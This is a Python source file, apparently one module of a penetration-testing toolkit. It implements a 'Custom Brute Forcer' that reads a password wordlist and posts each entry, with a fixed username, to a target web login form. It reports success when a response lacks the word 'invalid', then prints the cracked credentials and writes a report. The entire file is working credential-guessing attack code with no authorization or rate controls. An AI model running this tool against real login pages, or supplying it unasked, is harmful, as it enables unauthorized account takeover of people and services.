import requests
from utils.report_writer import write_report

def run(target_url, user_field, pass_field, username, wordlist_path, report_name):
    result = {
        "module": "Custom Brute Forcer",
        "target": target_url,
        "username": username,
        "wordlist": wordlist_path,
        "user_field": user_field,
        "pass_field": pass_field,
        "success": False,
        "password": None,
        "status": None
    }

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()

        print(f"[+] Starting brute-force on {target_url} with username '{username}'")

        for password in passwords:
            data = {user_field: username, pass_field: password}
            try:
                response = requests.post(target_url, data=data, timeout=5)

                if "invalid" not in response.text.lower() and response.status_code == 200:
                    print(f"[✓] Success: {username}:{password}")
                    result["success"] = True
                    result["password"] = password
                    result["status"] = "success"
                    break
                else:
                    print(f"[-] Failed: {username}:{password}")

            except Exception as e:
                print(f"[!] Error sending request: {e}")
                result["status"] = "error"
                result["error"] = str(e)
                break

        if not result["success"]:
            result["status"] = "failed"
            print("[!] Brute-force failed. No valid password found.")

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        print(f"[!] Error opening wordlist or connecting: {e}")

    write_report(result, report_name)
